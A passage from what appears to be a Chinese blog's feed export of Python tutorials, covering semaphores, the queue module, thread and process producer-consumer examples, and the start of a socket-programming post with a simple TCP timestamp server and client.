<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>输出结果之一如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt loading="lazy"></p>
<p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p>
<h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register
<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange
<span class="token keyword">from</span> threading <span class="token keyword">import</span> BoundedSemaphore<span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> Thread
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep

lock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
MAX <span class="token operator">=</span> <span class="token number">5</span>
candytray <span class="token operator">=</span> BoundedSemaphore<span class="token punctuation">(</span>MAX<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">refill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Refilling candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        candytray<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#释放信号量，使内部计数器增加一，可以唤醒等待的线程</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"full, skipping"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Buying candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> candytray<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"empty, skipping"</span><span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
        refill<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
        buy<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    nloops <span class="token operator">=</span> randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"THE CANDY MACHINE (full with &#123;&#125;)!"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>
    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>randrange<span class="token punctuation">(</span>nloops<span class="token punctuation">,</span> nloops <span class="token operator">+</span> MAX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>nloops<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@register</span>
<span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p><code>acquire(blocking=布尔值,timeout=None)</code></p>
<ul>
<li>本方法用于获得Semaphore</li>
<li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li>
<li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li>
<li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li>
</ul>
<p><code>release()</code></p>
<ul>
<li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li>
</ul>
<p>结果之一如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt loading="lazy"></p>
<h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p>
<p><strong>类</strong></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Queue(maxsize=0)</td>
<td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td>
</tr>
<tr>
<td align="center">LifoQueue(maxsize=0)</td>
<td align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td>
</tr>
<tr>
<td align="center">PriorityQueue(maxsize=0)</td>
<td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td>
</tr>
</tbody></table>
<p><strong>异常</strong></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Empty</td>
<td align="center">当对空队列调用get*()方法时抛出异常</td>
</tr>
<tr>
<td align="center">Full</td>
<td align="center">当对已满的队列调用put*()方法时抛出异常</td>
</tr>
</tbody></table>
<p><strong>方法</strong></p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">qsize()</td>
<td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td>
</tr>
<tr>
<td align="center">empty()</td>
<td align="center">如果队列为空，则返回True，否则返回False</td>
</tr>
<tr>
<td align="center">full()</td>
<td align="center">如果队列已满，则返回True，否则返回False</td>
</tr>
<tr>
<td align="center">put(item,block=True,timeout=None)</td>
<td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td>
</tr>
<tr>
<td align="center">put_nowait(item)</td>
<td align="center">和put(item,Flase)相同</td>
</tr>
<tr>
<td align="center">get(block=True,timeout-None)</td>
<td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td>
</tr>
<tr>
<td align="center">get_nowait()</td>
<td align="center">和get(False)相同</td>
</tr>
<tr>
<td align="center">task_done()</td>
<td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td>
</tr>
</tbody></table>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue
<span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread

<span class="token keyword">def</span> <span class="token function">writeQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
    queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"producing object for Q... "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"size now "</span><span class="token punctuation">,</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">randQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>
    val <span class="token operator">=</span> queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"consumed object from Q... size now "</span><span class="token punctuation">,</span> queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">writer</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#写数据入队列</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
        writeQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">reader</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#从队列中取出数据</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>
        randQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>
        sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token comment">#添加延时便于观察</span>

funcs <span class="token operator">=</span> <span class="token punctuation">[</span>reader<span class="token punctuation">,</span> writer<span class="token punctuation">]</span>
nfuncs <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    nloops <span class="token operator">=</span> <span class="token number">5</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>

    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token punctuation">,</span> nloops<span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>
        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>
        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<p>输出结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt loading="lazy"></p>
<h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing">multiprocessing</a> — 基于进程的并行</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Process<span class="token punctuation">,</span> JoinableQueue
<span class="token keyword">import</span> time
<span class="token keyword">import</span> random

<span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#从对列中取出并返回对象</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s 吃掉了 %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>
        q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕</span>

<span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> name<span class="token punctuation">,</span> food<span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">'%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>food<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token comment">#将res放入队列</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s 生产了 %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> JoinableQueue<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 使用JoinableQueue()</span>
    foods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"包子"</span><span class="token punctuation">,</span><span class="token string">"豆浆"</span><span class="token punctuation">,</span><span class="token string">"油条"</span><span class="token punctuation">,</span><span class="token string">"稀饭"</span><span class="token punctuation">]</span>
    producerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    consumerthreads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'厨师'</span><span class="token punctuation">,</span> foods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        producerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
        producerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>foods<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        t <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token string">'吃货'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        consumerthreads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
        consumerthreads<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>producerthreads<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        producerthreads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 1、主进程等生产者p1,p2,p3结束</span>
    <span class="token comment"># 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束</span>
    <span class="token comment"># 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END"</span><span class="token punctuation">)</span></code></pre>

<p>输出结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-网络编程</title>
    <url>/posts/c0f9c454/</url>
    <content><![CDATA[<h3 id="scoket模块"><a href="#scoket模块" class="headerlink" title="scoket模块"></a>scoket模块</h3><p>需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用<code>socket.scoket()</code>函数，它的一般语法如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">socket<span class="token punctuation">(</span>scoket_family<span class="token punctuation">,</span>scoket_type<span class="token punctuation">,</span>protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre>

<p><code>scoket_family</code>可以是<code>AF_UNIX</code>或<code>AF_INET(6)</code></p>
<ul>
<li><strong>AF_UNIX</strong>：UNIX，用于单一的<code>UNIX</code>系统进程之间的通信</li>
<li><strong>AF_INET(6)</strong>：因特网，IPv4或IPv6</li>
</ul>
<p><code>scoket_type</code>可以是<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></p>
<ul>
<li><strong>SOCK_STREAM</strong>：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)</li>
<li><strong>SOCK_DGRAM</strong>：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol</li>
</ul>
<p><code>protocol</code>参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略</p>
<span id="more"></span>

<p>创建<code>TCP/IP</code>套接字</p>
<pre class="language-python" data-language="python"><code class="language-python">tcpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span></code></pre>

<p>创建<code>UPD/IP</code>套接字</p>
<pre class="language-python" data-language="python"><code class="language-python">udpSock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span></code></pre>

<p>服务器套接字方法</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">s.bind()</td>
<td align="center">将地址(主机名字),绑定到套接字上，参数需要为元祖格式</td>
</tr>
<tr>
<td align="center">s.listen()</td>
<td align="center">设置并启动TCP监听器，参数为最大挂起连接数</td>
</tr>
<tr>
<td align="center">s.accept()</td>
<td align="center">被动接受TCP客户端连接，一直等待到连接到达(阻塞)</td>
</tr>
</tbody></table>
<p>客户端套接字方法</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">s.connect()</td>
<td align="center">主动发起TCP服务器连接</td>
</tr>
<tr>
<td align="center">s.connect_ex()</td>
<td align="center">connect的扩展版本，会以错误码形式返回问题，而不是抛出一个异常</td>
</tr>
</tbody></table>
<p>普通套接字方法</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">s.recv()</td>
<td align="center">接受TCP消息</td>
</tr>
<tr>
<td align="center">s.send()</td>
<td align="center">发送TCP消息</td>
</tr>
<tr>
<td align="center">s.sendall</td>
<td align="center">完整的发送TCP消息</td>
</tr>
<tr>
<td align="center">s.recvfrom()</td>
<td align="center">接收UDP消息</td>
</tr>
<tr>
<td align="center">s.sendto()</td>
<td align="center">发送UDP消息</td>
</tr>
<tr>
<td align="center">s.shutdown()</td>
<td align="center">关闭连接</td>
</tr>
<tr>
<td align="center">s.close()</td>
<td align="center">关闭套接字</td>
</tr>
</tbody></table>
<h3 id="TCP时间戳服务器"><a href="#TCP时间戳服务器" class="headerlink" title="TCP时间戳服务器"></a>TCP时间戳服务器</h3><p>服务器</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime

HOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

tcpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
tcpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>
tcpSerSock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for connection..."</span><span class="token punctuation">)</span>
    tcpCliSock<span class="token punctuation">,</span> addr <span class="token operator">=</span> tcpSerSock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...connected from:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
tcpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>客户端</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime

HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>
PORT <span class="token operator">=</span> <span class="token number">22222</span>
BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>
ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>

tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>
tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>

<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
